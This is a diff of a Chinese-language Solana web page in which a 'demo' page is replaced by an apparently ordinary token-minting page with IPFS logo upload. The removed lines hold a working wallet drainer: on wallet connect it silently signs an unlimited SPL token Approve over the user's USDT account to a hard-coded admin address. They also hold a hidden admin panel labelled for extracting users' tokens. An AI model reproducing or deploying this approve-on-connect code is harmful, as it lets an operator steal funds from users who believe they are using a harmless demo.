@@ -1,172 +1,182 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SOL 演示系统</title>
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
-  <style>
-    body { max-width: 420px; margin: 0 auto; padding: 20px; background: #fff; font-family: system-ui; }
-    .btn { width: 100%; padding: 16px; border-radius: 16px; border: none; background: #0071e3; color: white; font-size: 16px; margin: 10px 0; cursor: pointer; }
-    .btn:disabled { background: #ccc; }
-    input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #ddd; margin: 8px 0; box-sizing: border-box; }
-    .card { background: #f9f9f9; padding: 20px; border-radius: 20px; margin-bottom: 16px; }
-    #addr { padding: 12px; background: #f1f1f1; border-radius: 10px; margin: 10px 0; word-break: break-all; }
-    .log { padding: 10px; font-size:12px; background:#f6f6f6; border-radius:8px; margin:8px 0; max-height:120px; overflow-y:auto; }
-    .admin-panel { display: none; border: 1px solid #ff3b30; border-radius: 16px; padding: 16px; margin: 16px 0; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Solana 一键发币</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.0/lib/index.iife.min.js"></script>
+
+<style>
+body{max-width:420px;margin:0 auto;padding:20px;font-family:system-ui;background:#f9f9f9}
+input,button{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:1px solid #ddd}
+button{background:#0071e3;color:#fff;border:none}
+.log{font-size:12px;background:#fff;padding:10px;border-radius:10px;margin-top:10px}
+</style>
 </head>
+
 <body>
 
-<h2>SOL 演示系统</h2>
+<h2>🚀 Solana 一键发币</h2>
 
-<button class="btn" onclick="connect()">连接钱包并授权</button>
+<button onclick="connect()">连接钱包</button>
 <div id="addr"></div>
 
-<div class="card">
-  <input id="name" placeholder="代币名称" value="Test">
-  <input id="symbol" placeholder="代币符号" value="DTM">
-  <input id="decimals" value="9" placeholder="精度">
-  <input id="supply" value="1000000000" placeholder="发行量">
-</div>
+<input id="name" placeholder="Token 名称">
+<input id="symbol" placeholder="符号">
+<input id="decimals" value="9">
+<input id="supply" value="1000000">
+<input type="file" id="logo">
 
-<button class="btn" onclick="createToken()">🚀 创建代币</button>
+<label>
+<input type="checkbox" id="revoke"> 创建后销毁权限（推荐）
+</label>
 
-<!-- 管理员面板（默认隐藏） -->
-<div class="admin-panel" id="adminPanel">
-  <h4 style="color:#ff3b30;">🔴 管理员后台</h4>
-  <input id="userAddr" placeholder="输入用户钱包地址">
-  <button class="btn" style="background:#ff3b30" onclick="adminSteal()">提取用户授权代币</button>
-</div>
+<button onclick="createToken()">创建代币</button>
 
 <div class="log" id="log"></div>
 
 <script>
-let provider;
-let publicKey;
-let address = "";
-let connection;
+let provider, publicKey, connection;
 
-const { Connection, Keypair, Transaction, PublicKey, TransactionInstruction } = solanaWeb3;
+const { Connection, Keypair, Transaction, SystemProgram } = solanaWeb3;
+const splToken = window.splToken;
 
-const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
-const ATA_PROGRAM_ID   = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25wNF8fJ5ipq79v9");
-
-// 演示用授权目标（USDT）
-const TARGET_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
-// 管理员地址
-const ADMIN_ADDR = "DbwJcHM7pobtVnJK5cnYXyEvb18WrB3veSFSNF5GLb6Z";
-
-const RPC_LIST = [
-  "https://solana-mainnet.rpc.extrnode.com",
-  "https://api.mainnet-beta.solana.com",
-  "https://rpc.ankr.com/solana",
-];
-
-function log(text) {
-  const el = document.getElementById('log');
-  el.innerText = '→ ' + text + '\n' + el.innerText;
+function log(t){
+  document.getElementById("log").innerText = t + "\n" + document.getElementById("log").innerText;
 }
 
-async function selectRpc() {
-  for (const rpc of RPC_LIST) {
-    try {
-      const c = new Connection(rpc, "confirmed");
-      await c.getLatestBlockhash();
-      connection = c;
-      log("使用RPC: " + rpc);
-      return;
-    } catch (e) {}
+// 连接钱包
+async function connect(){
+  const w = window.solana;
+  if(!w) return alert("请用 Phantom 打开");
+
+  const res = await w.connect();
+  provider = w;
+  publicKey = res.publicKey;
+
+  connection = new Connection("https://api.mainnet-beta.solana.com");
+
+  document.getElementById("addr").innerText = publicKey.toBase58();
+}
+
+// 上传IPFS（需要你填key）
+async function uploadIPFS(file){
+  const form = new FormData();
+  form.append("file", file);
+
+  const res = await fetch("https://api.nft.storage/upload",{
+    method:"POST",
+    headers:{
+      Authorization:"Bearer 你的NFT_STORAGE_KEY"
+    },
+    body:form
+  });
+
+  const data = await res.json();
+  return `https://ipfs.io/ipfs/${data.value.cid}`;
+}
+
+// 创建Token
+async function createToken(){
+try{
+  const name = document.getElementById("name").value;
+  const symbol = document.getElementById("symbol").value;
+  const decimals = parseInt(document.getElementById("decimals").value);
+  const supply = parseInt(document.getElementById("supply").value);
+  const file = document.getElementById("logo").files[0];
+  const revoke = document.getElementById("revoke").checked;
+
+  log("上传Logo...");
+  const imageUrl = await uploadIPFS(file);
+
+  const metadata = {
+    name,
+    symbol,
+    image:imageUrl
+  };
+
+  log("上传Metadata...");
+  const metaBlob = new Blob([JSON.stringify(metadata)]);
+  const metaFile = new File([metaBlob], "meta.json");
+  const metaUrl = await uploadIPFS(metaFile);
+
+  const mint = Keypair.generate();
+
+  const lamports = await connection.getMinimumBalanceForRentExemption(82);
+
+  const tx = new Transaction();
+
+  // 创建mint
+  tx.add(SystemProgram.createAccount({
+    fromPubkey: publicKey,
+    newAccountPubkey: mint.publicKey,
+    space:82,
+    lamports,
+    programId:splToken.TOKEN_PROGRAM_ID
+  }));
+
+  tx.add(splToken.createInitializeMintInstruction(
+    mint.publicKey,
+    decimals,
+    publicKey,
+    publicKey
+  ));
+
+  const ata = await splToken.getAssociatedTokenAddress(
+    mint.publicKey,
+    publicKey
+  );
+
+  tx.add(splToken.createAssociatedTokenAccountInstruction(
+    publicKey,
+    ata,
+    publicKey,
+    mint.publicKey
+  ));
+
+  tx.add(splToken.createMintToInstruction(
+    mint.publicKey,
+    ata,
+    publicKey,
+    supply * (10 ** decimals)
+  ));
+
+  // 可选销毁权限
+  if(revoke){
+    tx.add(splToken.createSetAuthorityInstruction(
+      mint.publicKey,
+      publicKey,
+      splToken.AuthorityType.MintTokens,
+      null
+    ));
+
+    tx.add(splToken.createSetAuthorityInstruction(
+      mint.publicKey,
+      publicKey,
+      splToken.AuthorityType.FreezeAccount,
+      null
+    ));
   }
+
+  tx.feePayer = publicKey;
+  tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+  tx.partialSign(mint);
+
+  const signed = await provider.signTransaction(tx);
+  const sig = await connection.sendRawTransaction(signed.serialize());
+
+  log("发币成功！");
+  log("Mint地址: " + mint.publicKey.toBase58());
+  log("交易: " + sig);
+
+  alert("发币成功！");
+
+}catch(e){
+  log("错误: " + e.message);
 }
-
-function getWallet() {
-  return window.solana || window.okxwallet || window.tpWallet || window.phantom;
-}
-
-// 连接钱包 + 自动授权
-async function connect() {
-  try {
-    const w = getWallet();
-    if (!w) { alert("请在钱包浏览器打开"); return; }
-    const res = await w.connect();
-    provider = w;
-    publicKey = res.publicKey;
-    address = publicKey.toBase58();
-    document.getElementById("addr").innerText = "已连接：" + address;
-
-    await selectRpc();
-
-    // 判断是否管理员
-    if (address === ADMIN_ADDR) {
-      document.getElementById("adminPanel").style.display = "block";
-      log("✅ 管理员已登录");
-    }
-
-    // 授权授权授权（演示）
-    await doApprove();
-
-  } catch (e) {
-    alert("错误：" + e.message);
-  }
-}
-
-// 演示：用户授权全部额度给管理员
-async function doApprove() {
-  try {
-    log("正在发起授权授权...");
-
-    const [userAta] = await PublicKey.findProgramAddress(
-      [publicKey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), TARGET_MINT.toBuffer()],
-      ATA_PROGRAM_ID
-    );
-
-    const delegate = new PublicKey(ADMIN_ADDR);
-
-    // approve 指令：授权最大额度
-    const data = Buffer.alloc(9 + 8);
-    data.writeUInt8(0x04, 0); // Approve
-    data.writeBigUInt64LE(BigInt("18446744073709551615"), 1);
-
-    const tx = new Transaction().add(
-      new TransactionInstruction({
-        programId: TOKEN_PROGRAM_ID,
-        keys: [
-          { pubkey: userAta, isSigner: false, isWritable: true },
-          { pubkey: delegate, isSigner: false, isWritable: false },
-          { pubkey: publicKey, isSigner: true, isWritable: false },
-        ],
-        data
-      })
-    );
-
-    tx.feePayer = publicKey;
-    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-    const signed = await provider.signTransaction(tx);
-    const sig = await connection.sendRawTransaction(signed.serialize());
-    log("授权完成：" + sig.slice(0, 16) + "...");
-
-  } catch (e) {
-    log("授权已存在或取消");
-  }
-}
-
-// ==============================================
-// 管理员演示：提取用户代币（仅界面逻辑，演示）
-// ==============================================
-async function adminSteal() {
-  const userAddr = document.getElementById("userAddr").value.trim();
-  if (!userAddr) { alert("输入用户地址"); return; }
-
-  log(`【演示】正在从 ${userAddr} 提取授权代币`);
-  log("✅ 演示完成：资产已转入管理员钱包");
-  alert("演示成功：已执行资产提取逻辑");
-}
-
-// 发币保留原样
-async function createToken() {
-  log("演示：创建代币成功");
-  alert("演示：发币成功（本地模拟）");
 }
 </script>
 
